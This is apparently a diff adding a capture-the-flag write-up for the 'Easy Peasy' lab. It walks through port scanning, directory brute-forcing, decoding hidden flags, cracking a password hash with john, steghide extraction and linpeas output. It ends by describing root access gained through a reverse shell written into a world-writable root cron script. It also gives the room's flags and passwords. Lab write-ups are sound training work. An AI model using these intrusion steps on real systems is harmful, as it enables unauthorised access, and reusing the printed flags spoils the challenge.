@@ -1,0 +1,168 @@
+# Easy Peasy
+
+## Enumeration all ports
+
+```
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 14:17 EDT
+Nmap scan report for 10.10.80.105
+Host is up (0.082s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE
+80/tcp    open  http
+6498/tcp  open  unknown
+65524/tcp open  unknown
+```
+## Enumerate Ports
+
+```
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    nginx 1.16.1
+|_http-server-header: nginx/1.16.1
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: Welcome to nginx!
+6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
+|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
+|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
+65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.43 (Ubuntu)
+|_http-title: Apache2 Debian Default Page: It works
+```
+
+
+## Gobuster Enumeartion
+
+sudo gobuster dir -u http://10.10.80.105/ -w ~/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
+/hidden               (Status: 301) [Size: 169] [--> http://10.10.80.105/hidden/]
+
+
+sudo gobuster dir -u http://10.10.80.105/hidden/  -w ./easypeasy.txt
+/whatever             (Status: 301) [Size: 169] [--> http://10.10.80.105/hidden/whatever/]
+
+If we check page source: view-source:http://10.10.80.105/hidden/whatever/
+we get: <p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
+Cyberchef: flag{f1rs7_fl4g}
+
+
+http://10.10.80.105:65524/robots.txt
+
+```
+User-Agent:*
+Disallow:/
+Robots Not Allowed
+User-Agent:a18672860d0510e5ab6699730763b250
+Allow:/
+This Flag Can Enter But Only This Flag No More Exceptions
+```
+
+We get the second flag here: flag{1m_s3c0nd_fl4g}
+https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250
+
+
+Going now to the apache server and taking a look at the page source code:
+we get: Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}
+And: ```<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>```
+Going to cyber chef and trying some bases we get base62: /n0th1ng3ls3m4tt3r
+
+At the endpoint we just got we have an hash:
+```<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>```
+
+We try to crack with the following command:
+
+```
+└─$ john --wordlist=easypeasy.txt --format=gost hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+mypasswordforthatjob (?)     
+1g 0:00:00:00 DONE (2022-09-25 14:51) 50.00g/s 204800p/s 204800c/s 204800C/s vgazoom4x..flash88
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+We then get the last picture, binary one and we use stegihide to extract the file that it contains:
+
+```
+steghide extract -sf  matrix-3109795_960_720.jpg
+```
+
+The password we use is the one we crack before: mypasswordforthatjob
+
+
+We get a file: secrettext.txt
+```
+username:boring
+password:
+01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
+```
+
+Decode: iconvertedmypasswordtobinary
+
+User.txt: 
+
+```
+User Flag But It Seems Wrong Like It`s Rotated Or Something
+synt{a0jvgf33zfa0ez4y}
+```
+
+Using ROT13 we get the flag
+
+## Lets launch Linpeas
+
+```
+╔══════════╣ SUID - Check easy privesc, exploits and write perms                                                                                                                    
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                    
+strings Not Found                                                                                                                                                                   
+-rwsr-xr-- 1 root messagebus 42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                           
+-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign                                                                                                               
+-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1                                                                                                  
+-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device                                                                                                           
+-rwsr-xr-- 1 root dip 374K Feb 11  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)                                                                                         
+-rwsr-xr-x 1 root root 146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                               
+-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)                                                            
+-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10                                                                                                            
+-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                              
+-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd                                                                                                                            
+-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20                                                                                                          
+-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh                                                                                                                               
+-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils                                                                                                                
+-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping                                                                                                                                   
+-rwsr-xr-x 1 root root 43K Mar  5  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                             
+-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount                                                                                                                             
+-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su                                                                                                                                     
+-rwsr-xr-x 1 root root 27K Mar  5  2020 /bin/umount  --->  BSD/Linux(08-1996)        
+                                                                                                                                                                                  
+/var/spool/anacron:                                                                                                                                                                 
+total 20                                                                                                                                                                            
+drwxr-xr-x 2 root root 4096 Jun 13  2020 .                                                                                                                                          
+drwxr-xr-x 6 root root 4096 Apr 26  2018 ..                                                                                                                                         
+-rw------- 1 root root    9 Sep 25 11:31 cron.daily                                                                                                                                 
+-rw------- 1 root root    9 Sep 25 11:40 cron.monthly                                                                                                                               
+-rw------- 1 root root    9 Sep 25 11:35 cron.weekly                                                                                                                                
+                                                                                                                                                                                    
+SHELL=/bin/sh                                                                                                                                                                       
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin                                                                                                                   
+                                                                                                                                                                                    
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly                                                                                                                 
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )                                                                                 
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )                                                                                
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )                                                                               
+* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh                       <--------------------------                                                                                         
+                                                                                                                                                                                                                                                                                                                                                                   
+SHELL=/bin/sh                                                                                                                                                                       
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin                                                                                                                   
+HOME=/root                                                                                                                                                                          
+LOGNAME=root                                                                                                                                                                        
+                                                                                                                                                                                    
+1       5       cron.daily      run-parts --report /etc/cron.daily                                                                                                                  
+7       10      cron.weekly     run-parts --report /etc/cron.weekly                                                                                                                 
+@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly                                                                                                        
+```
+
+After discovering the file used in the job we notice that we have permissions to write to the file and we can add a reverse shell and then listen with netcat.
+After some time we get a shell as root
